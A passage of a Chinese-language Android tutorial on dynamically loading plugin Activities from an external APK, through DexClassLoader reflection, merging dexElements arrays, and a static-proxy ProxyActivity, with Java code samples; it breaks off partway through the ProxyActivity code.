<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressLint(&quot;NewApi&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loadApkClassLoader</span><span class="params">(DexClassLoader dLoader)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 配置动态加载环境</span></span><br><span class="line">        Object currentActivityThread = RefInvoke.invokeStaticMethod(</span><br><span class="line">                <span class="string">&quot;android.app.ActivityThread&quot;</span>, <span class="string">&quot;currentActivityThread&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;&#125;, <span class="keyword">new</span> Object[] &#123;&#125;); <span class="comment">// 获取ActivityThread对象</span></span><br><span class="line">        String packageName = <span class="keyword">this</span>.getPackageName();<span class="comment">// 当前apk的包名</span></span><br><span class="line">        ArrayMap mPackages = (ArrayMap) RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,</span><br><span class="line">                <span class="string">&quot;mPackages&quot;</span>);</span><br><span class="line">        WeakReference wr = (WeakReference) mPackages.get(packageName); <span class="comment">// 获取到LoadedApk对象</span></span><br><span class="line">        RefInvoke.setFieldOjbect(<span class="string">&quot;android.app.LoadedApk&quot;</span>, <span class="string">&quot;mClassLoader&quot;</span>,</span><br><span class="line">                wr.get(), dLoader); <span class="comment">// 设置LoadedApk中的mClassLoader的值为DexClassLoader</span></span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;classloader:&quot;</span>+dLoader);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;load apk classloader error:&quot;</span>+Log.getStackTraceString(e));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参数dLoader是需要替换的DexClassLoader，从外部传递过来，然后进行替换。我们看看外部定义的DexClassLoader类：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String filesDir = <span class="keyword">this</span>.getCacheDir().getAbsolutePath();</span><br><span class="line">String libPath = filesDir + File.separator +<span class="string">&quot;PluginActivity.apk&quot;</span>;</span><br><span class="line">Log.i(<span class="string">&quot;inject&quot;</span>, <span class="string">&quot;fileexist:&quot;</span>+<span class="keyword">new</span> File(libPath).exists());</span><br><span class="line">        </span><br><span class="line">loadResources(libPath);</span><br><span class="line">        </span><br><span class="line">DexClassLoader loader = <span class="keyword">new</span> DexClassLoader(libPath, filesDir,filesDir, getClassLoader());</span><br></pre></td></tr></table></figure>
<p>这里，需要注意的是，DexClassLoader的最后一个参数，是DexClassLoader的parent，这里需要设置成PathClassLoader类，因为我们上面虽然说是替换PathClassLoader为DexClassLoader。但是PathClassLoader是系统本身默认的类加载器(也就是mClassLoader变量的值，我们如果单独的将mClassLoader的值设置为DexClassLoader的话，就会出错的)，所以一定要将DexClassLoader的父加载器设置成PathClassLoader，因为类加载器是符合双亲委派机制的。<br>运行程序之前要在宿主项目的AndroidManifest.xml中声明插件的MainActivity</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;com.example.dynamicactivityapk.MainActivity&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>下面运行一下这个程序，首先将PluginActivity.apk放到宿主项目的cache目录下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb push PluginActivity.apk &#x2F;data&#x2F;data&#x2F;com.exmaple.testinjectdex&#x2F;cache</span><br></pre></td></tr></table></figure>
<p>再点击按钮就能看到效果了。</p>
<blockquote>
<ol>
<li>因为要加载插件中的资源，所以需要调用loadResources方法</li>
<li>在测试过程中，发现插件项目中setContentView方法没有效果了。所以要在插件项目中定义一个static的方法，用来提前设置视图的。</li>
</ol>
</blockquote>
<p><strong>思路2：合并PathClassLoader和DexClassLoader中的dexElements数组</strong><br>下面介绍另外一种设置类加载器的方式。<br>先来看一下PathClassLoader和DexClassLoader类加载器的父类BaseDexClassLoader的源码：<br>（需要注意的是PathClassLoader和DexClassLoader类的父加载器是BootClassLoader，它们的父类是BaseDexClassLoader）  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Base class for common functionality between various dex-based</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> ClassLoader&#125; implementations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseDexClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DexPathList pathList;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs an instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dexPath the list of jar/apk files containing classes and</span></span><br><span class="line"><span class="comment">     * resources, delimited by &#123;<span class="doctag">@code</span> File.pathSeparator&#125;, which</span></span><br><span class="line"><span class="comment">     * defaults to &#123;<span class="doctag">@code</span> &quot;:&quot;&#125; on Android</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> optimizedDirectory directory where optimized dex files</span></span><br><span class="line"><span class="comment">     * should be written; may be &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> libraryPath the list of directories containing native</span></span><br><span class="line"><span class="comment">     * libraries, delimited by &#123;<span class="doctag">@code</span> File.pathSeparator&#125;; may be</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> parent the parent class loader</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BaseDexClassLoader</span><span class="params">(String dexPath, File optimizedDirectory,</span></span></span><br><span class="line"><span class="function"><span class="params">            String libraryPath, ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="keyword">this</span>.pathList = <span class="keyword">new</span> DexPathList(<span class="keyword">this</span>, dexPath, libraryPath, optimizedDirectory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里有一个DexPathList对象，再来看一下DexPathList.java源码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A pair of lists of entries, associated with a &#123;<span class="doctag">@code</span> ClassLoader&#125;.</span></span><br><span class="line"><span class="comment"> * One of the lists is a dex/resource path &amp;mdash; typically referred</span></span><br><span class="line"><span class="comment"> * to as a &quot;class path&quot; &amp;mdash; list, and the other names directories</span></span><br><span class="line"><span class="comment"> * containing native code libraries. Class path entries may be any of:</span></span><br><span class="line"><span class="comment"> * a &#123;<span class="doctag">@code</span> .jar&#125; or &#123;<span class="doctag">@code</span> .zip&#125; file containing an optional</span></span><br><span class="line"><span class="comment"> * top-level &#123;<span class="doctag">@code</span> classes.dex&#125; file as well as arbitrary resources,</span></span><br><span class="line"><span class="comment"> * or a plain &#123;<span class="doctag">@code</span> .dex&#125; file (with no possibility of associated</span></span><br><span class="line"><span class="comment"> * resources).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This class also contains methods to use these lists to look up</span></span><br><span class="line"><span class="comment"> * classes and resources.&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*package*/</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">DexPathList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEX_SUFFIX = <span class="string">&quot;.dex&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String JAR_SUFFIX = <span class="string">&quot;.jar&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ZIP_SUFFIX = <span class="string">&quot;.zip&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String APK_SUFFIX = <span class="string">&quot;.apk&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** class definition context */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader definingContext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * List of dex/resource (class path) elements.</span></span><br><span class="line"><span class="comment">     * Should be called pathElements, but the Facebook app uses reflection</span></span><br><span class="line"><span class="comment">     * to modify &#x27;dexElements&#x27; (http://b/7726934).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Element[] dexElements;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of native library directories. */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> File[] nativeLibraryDirectories;</span><br></pre></td></tr></table></figure>
<p>首先看一下这个类的描述，还有一个Elements数组，这个变量是专门存放加载的dex文件的路径的。系统默认的类加载器是PathClassLoader，本身一个程序加载之后会释放一个dex出来，这时候会将dex路径放到里面，当然DexClassLoader也是一样的，那么我们会想到，我们可以将DexClassLoader中的dexElements和PathClassLoader中的dexElements进行合并，然后再设置给PathClassLoader中。我们来看代码：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下是另一种实现</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inject</span><span class="params">(DexClassLoader loader)</span></span>&#123;</span><br><span class="line">    PathClassLoader pathLoader = (PathClassLoader) getClassLoader();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object dexElements = combineArray(</span><br><span class="line">                getDexElements(getPathList(pathLoader)),</span><br><span class="line">                getDexElements(getPathList(loader)));</span><br><span class="line">        Object pathList = getPathList(pathLoader);</span><br><span class="line">        setField(pathList, pathList.getClass(), <span class="string">&quot;dexElements&quot;</span>, dexElements);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">getPathList</span><span class="params">(Object baseDexClassLoader)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IllegalArgumentException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ClassLoader bc = (ClassLoader)baseDexClassLoader;</span><br><span class="line">    <span class="keyword">return</span> getField(bc, Class.forName(<span class="string">&quot;dalvik.system.BaseDexClassLoader&quot;</span>), <span class="string">&quot;pathList&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">getField</span><span class="params">(Object obj, Class&lt;?&gt; cl, String field)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NoSuchFieldException, IllegalArgumentException, IllegalAccessException </span>&#123;</span><br><span class="line">    Field localField = cl.getDeclaredField(field);</span><br><span class="line">    localField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> localField.get(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">getDexElements</span><span class="params">(Object paramObject)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IllegalArgumentException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getField(paramObject, paramObject.getClass(), <span class="string">&quot;dexElements&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, Class&lt;?&gt; cl, String field,</span></span></span><br><span class="line"><span class="function"><span class="params">        Object value)</span> <span class="keyword">throws</span> NoSuchFieldException,</span></span><br><span class="line"><span class="function">        IllegalArgumentException, IllegalAccessException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Field localField = cl.getDeclaredField(field);</span><br><span class="line">    localField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    localField.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">combineArray</span><span class="params">(Object arrayLhs, Object arrayRhs)</span> </span>&#123;</span><br><span class="line">    Class&lt;?&gt; localClass = arrayLhs.getClass().getComponentType();</span><br><span class="line">    <span class="keyword">int</span> i = Array.getLength(arrayLhs);</span><br><span class="line">    <span class="keyword">int</span> j = i + Array.getLength(arrayRhs);</span><br><span class="line">    Object result = Array.newInstance(localClass, j);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; j; ++k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; i) &#123;</span><br><span class="line">            Array.set(result, k, Array.get(arrayLhs, k));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Array.set(result, k, Array.get(arrayRhs, k - i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再运行宿主项目，可以正常运行，效果和前面一样。<br>这两个思路的原理都是为了让我们动态加载进来的Activity能够具备正常的启动流程和生命周期。<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1slEgjiX">项目下载</a>  </p>
<h3 id="使用静态代理的方式来动态加载Activity"><a href="#使用静态代理的方式来动态加载Activity" class="headerlink" title="使用静态代理的方式来动态加载Activity"></a>使用静态代理的方式来动态加载Activity</h3><p>原理：<br><img src="/images/dynamicload/yuanli.png"><br>这里的ProxyActivity就是代理对象，而每个插件Activity都是被代理对象，每个插件Activity对象中都会有一个代理Activity的对象引用，这个就是静态代理，原理就很简单了，就是插件Activity实际上不是真正意义上的Activity了，而是它们把所有Activity中的任务用代理对象Activity来执行了，所以我们只需要在宿主项目中声明一个ProxyActivity，然后用反射的方法设置到每个动态加载的Activity中去就可以了，比如：Plugin1中Activity执行setContentView方法的时候，其实就是执行ProxyActivity中的setContentView方法了。<br>因此，这种方式来加载Activity的话，其实真正意义上每个插件的Activity都不再是像方式一中的那样，没有声明周期，没有启动流程了，它们就是一个普通的Activity类，然后将其生命周期的所有任务都交给代理Activity去执行就可以了。<br>下面我们来看一下项目：</p>
<ul>
<li>DynamicActivityForProxy —— 宿主项目</li>
<li>PluginActivity —— 插件项目</li>
</ul>
<p>看一下插件项目：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.dynamicactivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Activity mProxyActivity;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProxy</span><span class="params">(Activity proxyActivity)</span> </span>&#123; </span><br><span class="line">        mProxyActivity = proxyActivity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContentView</span><span class="params">(<span class="keyword">int</span> layoutResID)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (mProxyActivity != <span class="keyword">null</span> &amp;&amp; mProxyActivity <span class="keyword">instanceof</span> Activity) &#123;</span><br><span class="line">             mProxyActivity.setContentView(layoutResID);</span><br><span class="line">            mProxyActivity.findViewById(R.id.btn).setOnClickListener(</span><br><span class="line">                    <span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                            Toast.makeText(mProxyActivity, <span class="string">&quot;我是插件，你是谁!&quot;</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里重写了setContentView的方法，同时有一个setProxy方法。<br>再来看一下MainActivity.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">BaseActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//这里需要注意的是，不能调用super.onDestroy的方法了，不然报错，原因也很简单，这个Activity实质上不是真正的Activity了，没有生命周期的概念了，调用super的方法肯定报错</span></span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;onDestory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;onPause&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;onResume&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;onStart&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;onStop&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里打印一下生命周期中的每个方法，待会需要验证。<br>运行插件项目，得到一个PluginActivity.apk。<br>下面看一下宿主项目：<br>首先看一下重要的代理对象ProxyActivity  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.dynamic.activity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyActivity</span> <span class="keyword">extends</span> <span class="title">BaseActivity</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Object pluginActivity;</span><br><span class="line">    <span class="keyword">private</span> Class&lt;?&gt; pluginClass;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, Method&gt; methodMap = <span class="keyword">new</span> HashMap&lt;String, Method&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressLint(&quot;NewApi&quot;)</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DexClassLoader loader = initClassLoader();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//动态加载插件Activity</span></span><br><span class="line">            pluginClass = loader.loadClass(<span class="string">&quot;com.example.dynamicactivity.MainActivity&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; localConstructor = pluginClass.getConstructor(<span class="keyword">new</span> Class[] &#123;&#125;);</span><br><span class="line">            pluginActivity = 